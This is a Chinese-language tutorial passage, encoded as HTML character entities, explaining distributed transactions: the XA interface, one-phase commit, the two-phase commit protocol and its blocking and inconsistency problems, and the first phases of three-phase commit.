&#x901A;&#x5E38;&#x628A;&#x4E00;&#x4E2A;&#x6570;&#x636E;&#x5E93;&#x5185;&#x90E8;&#x7684;&#x4E8B;&#x52A1;&#x5904;&#x7406;&#xFF0C;&#x5982;&#x5BF9;&#x591A;&#x4E2A;&#x8868;&#x7684;&#x64CD;&#x4F5C;&#xFF0C;&#x4F5C;&#x4E3A;&#x672C;&#x5730;&#x4E8B;&#x52A1;&#x770B;&#x5F85;&#x3002;&#x6570;&#x636E;&#x5E93;&#x7684;&#x4E8B;&#x52A1;&#x5904;&#x7406;&#x5BF9;&#x8C61;&#x662F;&#x672C;&#x5730;&#x4E8B;&#x52A1;&#xFF0C;&#x800C;&#x5206;&#x5E03;&#x5F0F;&#x4E8B;&#x52A1;&#x5904;&#x7406;&#x7684;&#x5BF9;&#x8C61;&#x662F;&#x5168;&#x5C40;&#x4E8B;&#x52A1;&#x3002; &#x6240;&#x8C13;&#x5168;&#x5C40;&#x4E8B;&#x52A1;&#xFF0C;&#x662F;&#x6307;&#x5206;&#x5E03;&#x5F0F;&#x4E8B;&#x52A1;&#x5904;&#x7406;&#x73AF;&#x5883;&#x4E2D;&#xFF0C;&#x591A;&#x4E2A;&#x6570;&#x636E;&#x5E93;&#x53EF;&#x80FD;&#x9700;&#x8981;&#x5171;&#x540C;&#x5B8C;&#x6210;&#x4E00;&#x4E2A;&#x5DE5;&#x4F5C;&#xFF0C;&#x8FD9;&#x4E2A;&#x5DE5;&#x4F5C;&#x5373;&#x662F;&#x4E00;&#x4E2A;&#x5168;&#x5C40;&#x4E8B;&#x52A1;&#xFF0C;&#x4F8B;&#x5982;&#xFF0C;&#x4E00;&#x4E2A;&#x4E8B;&#x52A1;&#x4E2D;&#x53EF;&#x80FD;&#x66F4;&#x65B0;&#x51E0;&#x4E2A;&#x4E0D;&#x540C;&#x7684;&#x6570;&#x636E;&#x5E93;&#x3002;&#x5BF9;&#x6570;&#x636E;&#x5E93;&#x7684;&#x64CD;&#x4F5C;&#x53D1;&#x751F;&#x5728;&#x7CFB;&#x7EDF;&#x7684;&#x5404;&#x5904;&#x4F46;&#x5FC5;&#x987B;&#x5168;&#x90E8;&#x88AB;&#x63D0;&#x4EA4;&#x6216;&#x56DE;&#x6EDA;&#x3002;&#x6B64;&#x65F6;&#x4E00;&#x4E2A;&#x6570;&#x636E;&#x5E93;&#x5BF9;&#x81EA;&#x5DF1;&#x5185;&#x90E8;&#x6240;&#x505A;&#x64CD;&#x4F5C;&#x7684;&#x63D0;&#x4EA4;&#x4E0D;&#x4EC5;&#x4F9D;&#x8D56;&#x672C;&#x8EAB;&#x64CD;&#x4F5C;&#x662F;&#x5426;&#x6210;&#x529F;&#xFF0C;&#x8FD8;&#x8981;&#x4F9D;&#x8D56;&#x4E0E;&#x5168;&#x5C40;&#x4E8B;&#x52A1;&#x76F8;&#x5173;&#x7684;&#x5176;&#x5B83;&#x6570;&#x636E;&#x5E93;&#x7684;&#x64CD;&#x4F5C;&#x662F;&#x5426;&#x6210;&#x529F;&#xFF0C;&#x5982;&#x679C;&#x4EFB;&#x4E00;&#x6570;&#x636E;&#x5E93;&#x7684;&#x4EFB;&#x4E00;&#x64CD;&#x4F5C;&#x5931;&#x8D25;&#xFF0C;&#x5219;&#x53C2;&#x4E0E;&#x6B64;&#x4E8B;&#x52A1;&#x7684;&#x6240;&#x6709;&#x6570;&#x636E;&#x5E93;&#x6240;&#x505A;&#x7684;&#x6240;&#x6709;&#x64CD;&#x4F5C;&#x90FD;&#x5FC5;&#x987B;&#x56DE;&#x6EDA;&#x3002; &#x4E00;&#x822C;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x67D0;&#x4E00;&#x6570;&#x636E;&#x5E93;&#x65E0;&#x6CD5;&#x77E5;&#x9053;&#x5176;&#x5B83;&#x6570;&#x636E;&#x5E93;&#x5728;&#x505A;&#x4EC0;&#x4E48;&#xFF0C;&#x56E0;&#x6B64;&#xFF0C;&#x5728;&#x4E00;&#x4E2A; DTP &#x73AF;&#x5883;&#x4E2D;&#xFF0C;&#x4EA4;&#x6613;&#x4E2D;&#x95F4;&#x4EF6;&#x662F;&#x5FC5;&#x9700;&#x7684;&#xFF0C;&#x7531;&#x5B83;&#x901A;&#x77E5;&#x548C;&#x534F;&#x8C03;&#x76F8;&#x5173;&#x6570;&#x636E;&#x5E93;&#x7684;&#x63D0;&#x4EA4;&#x6216;&#x56DE;&#x6EDA;&#x3002;&#x800C;&#x4E00;&#x4E2A;&#x6570;&#x636E;&#x5E93;&#x53EA;&#x5C06;&#x5176;&#x81EA;&#x5DF1;&#x6240;&#x505A;&#x7684;&#x64CD;&#x4F5C;&#xFF08;&#x53EF;&#x6062;&#x590D;&#xFF09;&#x5F71;&#x5C04;&#x5230;&#x5168;&#x5C40;&#x4E8B;&#x52A1;&#x4E2D;&#x3002; XA &#x5C31;&#x662F; X/Open DTP &#x5B9A;&#x4E49;&#x7684;&#x4EA4;&#x6613;&#x4E2D;&#x95F4;&#x4EF6;&#x4E0E;&#x6570;&#x636E;&#x5E93;&#x4E4B;&#x95F4;&#x7684;&#x63A5;&#x53E3;&#x89C4;&#x8303;&#xFF08;&#x5373;&#x63A5;&#x53E3;&#x51FD;&#x6570;&#xFF09;&#xFF0C;&#x4EA4;&#x6613;&#x4E2D;&#x95F4;&#x4EF6;&#x7528;&#x5B83;&#x6765;&#x901A;&#x77E5;&#x6570;&#x636E;&#x5E93;&#x4E8B;&#x52A1;&#x7684;&#x5F00;&#x59CB;&#x3001;&#x7ED3;&#x675F;&#x4EE5;&#x53CA;&#x63D0;&#x4EA4;&#x3001;&#x56DE;&#x6EDA;&#x7B49;&#x3002; XA &#x63A5;&#x53E3;&#x51FD;&#x6570;&#x7531;&#x6570;&#x636E;&#x5E93;&#x5382;&#x5546;&#x63D0;&#x4F9B;&#x3002; &#x4E8C;&#x9636;&#x63D0;&#x4EA4;&#x534F;&#x8BAE;&#x548C;&#x4E09;&#x9636;&#x63D0;&#x4EA4;&#x534F;&#x8BAE;&#x5C31;&#x662F;&#x6839;&#x636E;&#x8FD9;&#x4E00;&#x601D;&#x60F3;&#x884D;&#x751F;&#x51FA;&#x6765;&#x7684;&#x3002;&#x53EF;&#x4EE5;&#x8BF4;&#x4E8C;&#x9636;&#x6BB5;&#x63D0;&#x4EA4;&#x5176;&#x5B9E;&#x5C31;&#x662F;&#x5B9E;&#x73B0;XA&#x5206;&#x5E03;&#x5F0F;&#x4E8B;&#x52A1;&#x7684;&#x5173;&#x952E;(&#x786E;&#x5207;&#x5730;&#x8BF4;&#xFF0C;&#x4E24;&#x9636;&#x6BB5;&#x63D0;&#x4EA4;&#x4E3B;&#x8981;&#x4FDD;&#x8BC1;&#x4E86;&#x5206;&#x5E03;&#x5F0F;&#x4E8B;&#x52A1;&#x7684;&#x539F;&#x5B50;&#x6027;&#xFF0C;&#x5373;&#x6240;&#x6709;&#x7ED3;&#x70B9;&#x8981;&#x4E48;&#x5168;&#x505A;&#x8981;&#x4E48;&#x5168;&#x4E0D;&#x505A;) &#x4E00;&#x9636;&#x6BB5;&#x63D0;&#x4EA4;(Best Efforts 1PC&#x6A21;&#x5F0F;)&#x4E00;&#x9636;&#x6BB5;&#x63D0;&#x4EA4;&#x975E;&#x5E38;&#x76F4;&#x767D;&#xFF0C;&#x5C31;&#x662F;&#x4ECE;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x5411;&#x6570;&#x636E;&#x5E93;&#x53D1;&#x51FA;&#x63D0;&#x4EA4;&#x8BF7;&#x6C42;&#x5230;&#x6570;&#x636E;&#x5E93;&#x5B8C;&#x6210;&#x63D0;&#x4EA4;&#x6216;&#x56DE;&#x6EDA;&#x4E4B;&#x540E;&#x5C06;&#x7ED3;&#x679C;&#x8FD4;&#x56DE;&#x7ED9;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x7684;&#x8FC7;&#x7A0B;&#x3002;&#x4E00;&#x9636;&#x6BB5;&#x63D0;&#x4EA4;&#x4E0D;&#x9700;&#x8981;&#x201C;&#x534F;&#x8C03;&#x8005;&#x201D;&#x89D2;&#x8272;&#xFF0C;&#x5404;&#x7ED3;&#x70B9;&#x4E4B;&#x95F4;&#x4E0D;&#x5B58;&#x5728;&#x534F;&#x8C03;&#x64CD;&#x4F5C;&#xFF0C;&#x56E0;&#x6B64;&#x5176;&#x4E8B;&#x52A1;&#x6267;&#x884C;&#x65F6;&#x95F4;&#x6BD4;&#x4E24;&#x9636;&#x6BB5;&#x63D0;&#x4EA4;&#x8981;&#x77ED; &#x4E8C;&#x9636;&#x6BB5;&#x63D0;&#x4EA4;(Two-phaseCommit/2PC)&#x53C2;&#x4E0E;&#x8005;&#x5C06;&#x64CD;&#x4F5C;&#x6210;&#x8D25;&#x901A;&#x77E5;&#x534F;&#x8C03;&#x8005;&#xFF0C;&#x518D;&#x7531;&#x534F;&#x8C03;&#x8005;&#x6839;&#x636E;&#x6240;&#x6709;&#x53C2;&#x4E0E;&#x8005;&#x7684;&#x53CD;&#x9988;&#x60C5;&#x62A5;&#x51B3;&#x5B9A;&#x5404;&#x53C2;&#x4E0E;&#x8005;&#x662F;&#x5426;&#x8981;&#x63D0;&#x4EA4;&#x64CD;&#x4F5C;&#x8FD8;&#x662F;&#x4E2D;&#x6B62;&#x64CD;&#x4F5C;&#x6240;&#x8C13;&#x7684;&#x4E24;&#x4E2A;&#x9636;&#x6BB5;&#x662F;&#x6307;&#xFF1A;&#x7B2C;&#x4E00;&#x9636;&#x6BB5;&#xFF1A;&#x51C6;&#x5907;&#x9636;&#x6BB5;(&#x6295;&#x7968;&#x9636;&#x6BB5;)&#x548C;&#x7B2C;&#x4E8C;&#x9636;&#x6BB5;&#xFF1A;&#x63D0;&#x4EA4;&#x9636;&#x6BB5;&#xFF08;&#x6267;&#x884C;&#x9636;&#x6BB5;&#xFF09; &#x51C6;&#x5907;&#x9636;&#x6BB5; &#x534F;&#x8C03;&#x8005;&#x8282;&#x70B9;&#x5411;&#x6240;&#x6709;&#x53C2;&#x4E0E;&#x8005;&#x8282;&#x70B9;&#x8BE2;&#x95EE;&#x662F;&#x5426;&#x53EF;&#x4EE5;&#x6267;&#x884C;&#x63D0;&#x4EA4;&#x64CD;&#x4F5C;(vote)&#xFF0C;&#x5E76;&#x5F00;&#x59CB;&#x7B49;&#x5F85;&#x5404;&#x53C2;&#x4E0E;&#x8005;&#x8282;&#x70B9;&#x7684;&#x54CD;&#x5E94;&#x3002; &#x53C2;&#x4E0E;&#x8005;&#x8282;&#x70B9;&#x6267;&#x884C;&#x8BE2;&#x95EE;&#x53D1;&#x8D77;&#x4E3A;&#x6B62;&#x7684;&#x6240;&#x6709;&#x4E8B;&#x52A1;&#x64CD;&#x4F5C;&#xFF0C;&#x5E76;&#x5C06;Undo&#x4FE1;&#x606F;&#x548C;Redo&#x4FE1;&#x606F;&#x5199;&#x5165;&#x65E5;&#x5FD7;&#x3002;&#xFF08;&#x6CE8;&#x610F;&#xFF1A;&#x82E5;&#x6210;&#x529F;&#x8FD9;&#x91CC;&#x5176;&#x5B9E;&#x6BCF;&#x4E2A;&#x53C2;&#x4E0E;&#x8005;&#x5DF2;&#x7ECF;&#x6267;&#x884C;&#x4E86;&#x4E8B;&#x52A1;&#x64CD;&#x4F5C;&#xFF09; &#x5404;&#x53C2;&#x4E0E;&#x8005;&#x8282;&#x70B9;&#x54CD;&#x5E94;&#x534F;&#x8C03;&#x8005;&#x8282;&#x70B9;&#x53D1;&#x8D77;&#x7684;&#x8BE2;&#x95EE;&#x3002;&#x5982;&#x679C;&#x53C2;&#x4E0E;&#x8005;&#x8282;&#x70B9;&#x7684;&#x4E8B;&#x52A1;&#x64CD;&#x4F5C;&#x5B9E;&#x9645;&#x6267;&#x884C;&#x6210;&#x529F;&#xFF0C;&#x5219;&#x5B83;&#x8FD4;&#x56DE;&#x4E00;&#x4E2A;&#x201D;&#x540C;&#x610F;&#x201D;&#x6D88;&#x606F;&#xFF1B;&#x5982;&#x679C;&#x53C2;&#x4E0E;&#x8005;&#x8282;&#x70B9;&#x7684;&#x4E8B;&#x52A1;&#x64CD;&#x4F5C;&#x5B9E;&#x9645;&#x6267;&#x884C;&#x5931;&#x8D25;&#xFF0C;&#x5219;&#x5B83;&#x8FD4;&#x56DE;&#x4E00;&#x4E2A;&#x201D;&#x4E2D;&#x6B62;&#x201D;&#x6D88;&#x606F;&#x3002; &#x63D0;&#x4EA4;&#x9636;&#x6BB5; &#x534F;&#x8C03;&#x8005;&#x8282;&#x70B9;&#x5411;&#x6240;&#x6709;&#x53C2;&#x4E0E;&#x8005;&#x8282;&#x70B9;&#x53D1;&#x51FA;&#x201D;&#x6B63;&#x5F0F;&#x63D0;&#x4EA4;(commit)&#x201D;&#x7684;&#x8BF7;&#x6C42;&#x3002; &#x53C2;&#x4E0E;&#x8005;&#x8282;&#x70B9;&#x6B63;&#x5F0F;&#x5B8C;&#x6210;&#x64CD;&#x4F5C;&#xFF0C;&#x5E76;&#x91CA;&#x653E;&#x5728;&#x6574;&#x4E2A;&#x4E8B;&#x52A1;&#x671F;&#x95F4;&#x5185;&#x5360;&#x7528;&#x7684;&#x8D44;&#x6E90;&#x3002; &#x53C2;&#x4E0E;&#x8005;&#x8282;&#x70B9;&#x5411;&#x534F;&#x8C03;&#x8005;&#x8282;&#x70B9;&#x53D1;&#x9001;&#x201D;&#x5B8C;&#x6210;&#x201D;&#x6D88;&#x606F;&#x3002; &#x534F;&#x8C03;&#x8005;&#x8282;&#x70B9;&#x53D7;&#x5230;&#x6240;&#x6709;&#x53C2;&#x4E0E;&#x8005;&#x8282;&#x70B9;&#x53CD;&#x9988;&#x7684;&#x201D;&#x5B8C;&#x6210;&#x201D;&#x6D88;&#x606F;&#x540E;&#xFF0C;&#x5B8C;&#x6210;&#x4E8B;&#x52A1;&#x3002; &#x5982;&#x679C;&#x4EFB;&#x4E00;&#x53C2;&#x4E0E;&#x8005;&#x8282;&#x70B9;&#x5728;&#x7B2C;&#x4E00;&#x9636;&#x6BB5;&#x8FD4;&#x56DE;&#x7684;&#x54CD;&#x5E94;&#x6D88;&#x606F;&#x4E3A;&#x201D;&#x4E2D;&#x6B62;&#x201D;&#xFF0C;&#x6216;&#x8005; &#x534F;&#x8C03;&#x8005;&#x8282;&#x70B9;&#x5728;&#x7B2C;&#x4E00;&#x9636;&#x6BB5;&#x7684;&#x8BE2;&#x95EE;&#x8D85;&#x65F6;&#x4E4B;&#x524D;&#x65E0;&#x6CD5;&#x83B7;&#x53D6;&#x6240;&#x6709;&#x53C2;&#x4E0E;&#x8005;&#x8282;&#x70B9;&#x7684;&#x54CD;&#x5E94;&#x6D88;&#x606F;&#x65F6; &#x534F;&#x8C03;&#x8005;&#x8282;&#x70B9;&#x5411;&#x6240;&#x6709;&#x53C2;&#x4E0E;&#x8005;&#x8282;&#x70B9;&#x53D1;&#x51FA;&#x201D;&#x56DE;&#x6EDA;&#x64CD;&#x4F5C;(rollback)&#x201D;&#x7684;&#x8BF7;&#x6C42;&#x3002; &#x53C2;&#x4E0E;&#x8005;&#x8282;&#x70B9;&#x5229;&#x7528;&#x4E4B;&#x524D;&#x5199;&#x5165;&#x7684;Undo&#x4FE1;&#x606F;&#x6267;&#x884C;&#x56DE;&#x6EDA;&#xFF0C;&#x5E76;&#x91CA;&#x653E;&#x5728;&#x6574;&#x4E2A;&#x4E8B;&#x52A1;&#x671F;&#x95F4;&#x5185;&#x5360;&#x7528;&#x7684;&#x8D44;&#x6E90;&#x3002; &#x53C2;&#x4E0E;&#x8005;&#x8282;&#x70B9;&#x5411;&#x534F;&#x8C03;&#x8005;&#x8282;&#x70B9;&#x53D1;&#x9001;&#x201D;&#x56DE;&#x6EDA;&#x5B8C;&#x6210;&#x201D;&#x6D88;&#x606F;&#x3002; &#x534F;&#x8C03;&#x8005;&#x8282;&#x70B9;&#x53D7;&#x5230;&#x6240;&#x6709;&#x53C2;&#x4E0E;&#x8005;&#x8282;&#x70B9;&#x53CD;&#x9988;&#x7684;&#x201D;&#x56DE;&#x6EDA;&#x5B8C;&#x6210;&#x201D;&#x6D88;&#x606F;&#x540E;&#xFF0C;&#x53D6;&#x6D88;&#x4E8B;&#x52A1; &#x4E0D;&#x7BA1;&#x6700;&#x540E;&#x7ED3;&#x679C;&#x5982;&#x4F55;&#xFF0C;&#x7B2C;&#x4E8C;&#x9636;&#x6BB5;&#x90FD;&#x4F1A;&#x7ED3;&#x675F;&#x5F53;&#x524D;&#x4E8B;&#x52A1; &#x4E8C;&#x9636;&#x6BB5;&#x5B58;&#x5728;&#x7684;&#x95EE;&#x9898; &#x540C;&#x6B65;&#x963B;&#x585E;&#x95EE;&#x9898;&#x3002;&#x6267;&#x884C;&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;&#x6240;&#x6709;&#x53C2;&#x4E0E;&#x8282;&#x70B9;&#x90FD;&#x662F;&#x4E8B;&#x52A1;&#x963B;&#x585E;&#x578B;&#x7684;&#x3002;&#x5F53;&#x53C2;&#x4E0E;&#x8005;&#x5360;&#x6709;&#x516C;&#x5171;&#x8D44;&#x6E90;&#x65F6;&#xFF0C;&#x5176;&#x4ED6;&#x7B2C;&#x4E09;&#x65B9;&#x8282;&#x70B9;&#x8BBF;&#x95EE;&#x516C;&#x5171;&#x8D44;&#x6E90;&#x4E0D;&#x5F97;&#x4E0D;&#x5904;&#x4E8E;&#x963B;&#x585E;&#x72B6;&#x6001;&#x3002; &#x5355;&#x70B9;&#x6545;&#x969C;&#x3002;&#x7531;&#x4E8E;&#x534F;&#x8C03;&#x8005;&#x7684;&#x91CD;&#x8981;&#x6027;&#xFF0C;&#x4E00;&#x65E6;&#x534F;&#x8C03;&#x8005;&#x53D1;&#x751F;&#x6545;&#x969C;&#x3002;&#x53C2;&#x4E0E;&#x8005;&#x4F1A;&#x4E00;&#x76F4;&#x963B;&#x585E;&#x4E0B;&#x53BB;&#x3002;&#x5C24;&#x5176;&#x5728;&#x7B2C;&#x4E8C;&#x9636;&#x6BB5;&#xFF0C;&#x534F;&#x8C03;&#x8005;&#x53D1;&#x751F;&#x6545;&#x969C;&#xFF0C;&#x90A3;&#x4E48;&#x6240;&#x6709;&#x7684;&#x53C2;&#x4E0E;&#x8005;&#x8FD8;&#x90FD;&#x5904;&#x4E8E;&#x9501;&#x5B9A;&#x4E8B;&#x52A1;&#x8D44;&#x6E90;&#x7684;&#x72B6;&#x6001;&#x4E2D;&#xFF0C;&#x800C;&#x65E0;&#x6CD5;&#x7EE7;&#x7EED;&#x5B8C;&#x6210;&#x4E8B;&#x52A1;&#x64CD;&#x4F5C;&#x3002;&#xFF08;&#x5982;&#x679C;&#x662F;&#x534F;&#x8C03;&#x8005;&#x6302;&#x6389;&#xFF0C;&#x53EF;&#x4EE5;&#x91CD;&#x65B0;&#x9009;&#x4E3E;&#x4E00;&#x4E2A;&#x534F;&#x8C03;&#x8005;&#xFF0C;&#x4F46;&#x662F;&#x65E0;&#x6CD5;&#x89E3;&#x51B3;&#x56E0;&#x4E3A;&#x534F;&#x8C03;&#x8005;&#x5B95;&#x673A;&#x5BFC;&#x81F4;&#x7684;&#x53C2;&#x4E0E;&#x8005;&#x5904;&#x4E8E;&#x963B;&#x585E;&#x72B6;&#x6001;&#x7684;&#x95EE;&#x9898;&#xFF09; &#x6570;&#x636E;&#x4E0D;&#x4E00;&#x81F4;&#x3002;&#x5728;&#x4E8C;&#x9636;&#x6BB5;&#x63D0;&#x4EA4;&#x7684;&#x9636;&#x6BB5;&#x4E8C;&#x4E2D;&#xFF0C;&#x5F53;&#x534F;&#x8C03;&#x8005;&#x5411;&#x53C2;&#x4E0E;&#x8005;&#x53D1;&#x9001;commit&#x8BF7;&#x6C42;&#x4E4B;&#x540E;&#xFF0C;&#x53D1;&#x751F;&#x4E86;&#x5C40;&#x90E8;&#x7F51;&#x7EDC;&#x5F02;&#x5E38;&#x6216;&#x8005;&#x5728;&#x53D1;&#x9001;commit&#x8BF7;&#x6C42;&#x8FC7;&#x7A0B;&#x4E2D;&#x534F;&#x8C03;&#x8005;&#x53D1;&#x751F;&#x4E86;&#x6545;&#x969C;&#xFF0C;&#x8FD9;&#x56DE;&#x5BFC;&#x81F4;&#x53EA;&#x6709;&#x4E00;&#x90E8;&#x5206;&#x53C2;&#x4E0E;&#x8005;&#x63A5;&#x53D7;&#x5230;&#x4E86;commit&#x8BF7;&#x6C42;&#x3002;&#x800C;&#x5728;&#x8FD9;&#x90E8;&#x5206;&#x53C2;&#x4E0E;&#x8005;&#x63A5;&#x5230;commit&#x8BF7;&#x6C42;&#x4E4B;&#x540E;&#x5C31;&#x4F1A;&#x6267;&#x884C;commit&#x64CD;&#x4F5C;&#x3002;&#x4F46;&#x662F;&#x5176;&#x4ED6;&#x90E8;&#x5206;&#x672A;&#x63A5;&#x5230;commit&#x8BF7;&#x6C42;&#x7684;&#x673A;&#x5668;&#x5219;&#x65E0;&#x6CD5;&#x6267;&#x884C;&#x4E8B;&#x52A1;&#x63D0;&#x4EA4;&#x3002;&#x4E8E;&#x662F;&#x6574;&#x4E2A;&#x5206;&#x5E03;&#x5F0F;&#x7CFB;&#x7EDF;&#x4FBF;&#x51FA;&#x73B0;&#x4E86;&#x6570;&#x636E;&#x90E8;&#x4E00;&#x81F4;&#x6027;&#x7684;&#x73B0;&#x8C61;&#x3002; &#x4E8C;&#x9636;&#x6BB5;&#x65E0;&#x6CD5;&#x89E3;&#x51B3;&#x7684;&#x95EE;&#x9898;&#xFF1A;&#x534F;&#x8C03;&#x8005;&#x518D;&#x53D1;&#x51FA;commit&#x6D88;&#x606F;&#x4E4B;&#x540E;&#x5B95;&#x673A;&#xFF0C;&#x800C;&#x552F;&#x4E00;&#x63A5;&#x6536;&#x5230;&#x8FD9;&#x6761;&#x6D88;&#x606F;&#x7684;&#x53C2;&#x4E0E;&#x8005;&#x540C;&#x65F6;&#x4E5F;&#x5B95;&#x673A;&#x4E86;&#x3002;&#x90A3;&#x4E48;&#x5373;&#x4F7F;&#x534F;&#x8C03;&#x8005;&#x901A;&#x8FC7;&#x9009;&#x4E3E;&#x534F;&#x8BAE;&#x4EA7;&#x751F;&#x4E86;&#x65B0;&#x7684;&#x534F;&#x8C03;&#x8005;&#xFF0C;&#x8FD9;&#x6761;&#x4E8B;&#x52A1;&#x7684;&#x72B6;&#x6001;&#x4E5F;&#x662F;&#x4E0D;&#x786E;&#x5B9A;&#x7684;&#xFF0C;&#x6CA1;&#x4EBA;&#x77E5;&#x9053;&#x4E8B;&#x52A1;&#x662F;&#x5426;&#x88AB;&#x5DF2;&#x7ECF;&#x63D0;&#x4EA4; &#x4E09;&#x9636;&#x6BB5;&#x63D0;&#x4EA4;&#xFF08;Three-phase commit/3PC&#xFF09;&#x6539;&#x8FDB;&#x4E86;&#x4E24;&#x9636;&#x6BB5;&#x63D0;&#x4EA4;,3PC&#x4E3B;&#x8981;&#x89E3;&#x51B3;&#x7684;&#x5355;&#x70B9;&#x6545;&#x969C;&#x95EE;&#x9898;&#xFF0C;&#x5E76;&#x51CF;&#x5C11;&#x963B;&#x585E; &#x5F15;&#x5165;&#x8D85;&#x65F6;&#x673A;&#x5236;&#x3002;&#x540C;&#x65F6;&#x5728;&#x534F;&#x8C03;&#x8005;&#x548C;&#x53C2;&#x4E0E;&#x8005;&#x4E2D;&#x90FD;&#x5F15;&#x5165;&#x8D85;&#x65F6;&#x673A;&#x5236;&#x3002; &#x5728;&#x7B2C;&#x4E00;&#x9636;&#x6BB5;&#x548C;&#x7B2C;&#x4E8C;&#x9636;&#x6BB5;&#x4E2D;&#x63D2;&#x5165;&#x4E00;&#x4E2A;&#x51C6;&#x5907;&#x9636;&#x6BB5;&#x3002;&#x4FDD;&#x8BC1;&#x4E86;&#x5728;&#x6700;&#x540E;&#x63D0;&#x4EA4;&#x9636;&#x6BB5;&#x4E4B;&#x524D;&#x5404;&#x53C2;&#x4E0E;&#x8282;&#x70B9;&#x7684;&#x72B6;&#x6001;&#x662F;&#x4E00;&#x81F4;&#x7684;&#x3002; &#x9664;&#x4E86;&#x5F15;&#x5165;&#x8D85;&#x65F6;&#x673A;&#x5236;&#x4E4B;&#x5916;&#xFF0C;3PC&#x628A;2PC&#x7684;&#x51C6;&#x5907;&#x9636;&#x6BB5;&#x518D;&#x6B21;&#x4E00;&#x5206;&#x4E3A;&#x4E8C;&#xFF0C;&#x8FD9;&#x6837;&#x4E09;&#x9636;&#x6BB5;&#x63D0;&#x4EA4;&#x5C31;&#x6709;CanCommit&#x3001;PreCommit&#x3001;DoCommit&#x4E09;&#x4E2A;&#x9636;&#x6BB5;&#x3002; CanCommit&#x9636;&#x6BB5; &#x4E8B;&#x52A1;&#x8BE2;&#x95EE; &#x534F;&#x8C03;&#x8005;&#x5411;&#x53C2;&#x4E0E;&#x8005;&#x53D1;&#x9001;CanCommit&#x8BF7;&#x6C42;&#x3002;&#x8BE2;&#x95EE;&#x662F;&#x5426;&#x53EF;&#x4EE5;&#x6267;&#x884C;&#x4E8B;&#x52A1;&#x63D0;&#x4EA4;&#x64CD;&#x4F5C;&#x3002;&#x7136;&#x540E;&#x5F00;&#x59CB;&#x7B49;&#x5F85;&#x53C2;&#x4E0E;&#x8005;&#x7684;&#x54CD;&#x5E94;&#x3002; &#x54CD;&#x5E94;&#x53CD;&#x9988; &#x53C2;&#x4E0E;&#x8005;&#x63A5;&#x5230;CanCommit&#x8BF7;&#x6C42;&#x4E4B;&#x540E;&#xFF0C;&#x6B63;&#x5E38;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x5982;&#x679C;&#x5176;&#x81EA;&#x8EAB;&#x8BA4;&#x4E3A;&#x53EF;&#x4EE5;&#x987A;&#x5229;&#x6267;&#x884C;&#x4E8B;&#x52A1;&#xFF0C;&#x5219;&#x8FD4;&#x56DE;Yes&#x54CD;&#x5E94;&#xFF0C;&#x5E76;&#x8FDB;&#x5165;&#x9884;&#x5907;&#x72B6;&#x6001;&#x3002;&#x5426;&#x5219;&#x53CD;&#x9988;No PreCommit&#x9636;&#x6BB5;&#x5047;&#x5982;&#x534F;&#x8C03;&#x8005;&#x4ECE;&#x6240;&#x6709;&#x7684;&#x53C2;&#x4E0E;&#x8005;&#x83B7;&#x5F97;&#x7684;&#x53CD;&#x9988;&#x90FD;&#x662F;Yes&#x54CD;&#x5E94;&#xFF0C;&#x90A3;&#x4E48;&#x5C31;&#x4F1A;&#x6267;&#x884C;&#x4E8B;&#x52A1;&#x7684;&#x9884;&#x6267;&#x884C; &#x53D1;&#x9001;&#x9884;&#x63D0;&#x4EA4;&#x8BF7;&#x6C42; &#x534F;&#x8C03;&#x8005;&#x5411;&#x53C2;&#x4E0E;&#x8005;&#x53D1;&#x9001;PreCommit&#x8BF7;&#x6C42;&#xFF0C;&#x5E76;&#x8FDB;&#x5165;Prepared&#x9636;&#x6BB5;&#x3002; &#x4E8B;&#x52A1;&#x9884;&#x63D0;&#x4EA4; &#x53C2;&#x4E0E;&#x8005;&#x63A5;&#x6536;&#x5230;PreCommit&#x8BF7;&#x6C42;&#x540E;&#xFF0C;&#x4F1A;&#x6267;&#x884C;&#x4E8B;&#x52A1;&#x64CD;&#x4F5C;&#xFF0C;&#x5E76;&#x5C06;undo&#x548C;redo&#x4FE1;&#x606F;&#x8BB0;&#x5F55;&#x5230;&#x4E8B;&#x52A1;&#x65E5;&#x5FD7;&#x4E2D;&#x3002; &#x54CD;&#x5E94;&#x53CD;&#x9988; &#x5982;&#x679C;&#x53C2;&#x4E0E;&#x8005;&#x6210;&#x529F;&#x7684;&#x6267;&#x884C;&#x4E86;&#x4E8B;&#x52A1;&#x64CD;&#x4F5C;&#xFF0C;&#x5219;&#x8FD4;&#x56DE;ACK&#x54CD;&#x5E94;&#xFF0C;&#x540C;&#x65F6;&#x5F00;&#x59CB;&#x7B49;&#x5F85;&#x6700;&#x7EC8;&#x6307;&#x4EE4;&#x3002; &#x5047;&#x5982;&#x6709;&#x4EFB;&#x4F55;&#x4E00;&#x4E2A;&#x53C2;&#x4E0E;&#x8005;&#x5411;&#x534F;&#x8C03;&#x8005;&#x53D1;&#x9001;&#x4E86;No&#x54CD;&#x5E94;&#xFF0C;&#x6216;&#x8005;&#x7B49;&#x5F85;&#x8D85;&#x65F6;&#x4E4B;&#x540E;&#xFF0C;&#x534F;&#x8C03;&#x8005;&#x90FD;&#x6CA1;&#x6709;&#x63A5;&#x5230;&#x53C2;&#x4E0E;&#x8005;&#x7684;&#x54CD;&#x5E94;&#xFF0C;&#x90A3;&#x4E48;&#x5C31;&#x6267;&#x884C;&#x4E8B;&#x52A1;&#x7684;&#x4E2D;&#x65AD;&#x3002; &#x53D1;&#x9001;&#x4E2D;&#x65AD;&#x8BF7;&#x6C42; &#x534F;&#x8C03;&#x8005;&#x5411;&#x6240;&#x6709;&#x53C2;&#x4E0E;&#x8005;&#x53D1;&#x9001;abort&#x8BF7;&#x6C42;&#x3002; &#x4E2D;&#x65AD;&#x4E8B;&#x52A1; &#x53C2;&#x4E0E;&#x8005;&#x6536;&#x5230;&#x6765;&#x81EA;&#x534F;&#x8C03;&#x8005;&#x7684;abort&#x8BF7;&#x6C42;&#x4E4B;&#x540E;&#xFF08;&#x6216;&#x8D85;&#x65F6;&#x4E4B;&#x540E;&#xFF0C;&#x4ECD;&#x672A;&#x6536;&#x5230;&#x534F;&#x8C03;&#x8005;&#x7684;&#x8BF7;&#x6C42;&#xFF09;&#xFF0C;&#x6267;&#x884C;&#x4E8B;&#x52A1;&#x7684;&#x4E2D;&#x65AD;&#x3002; 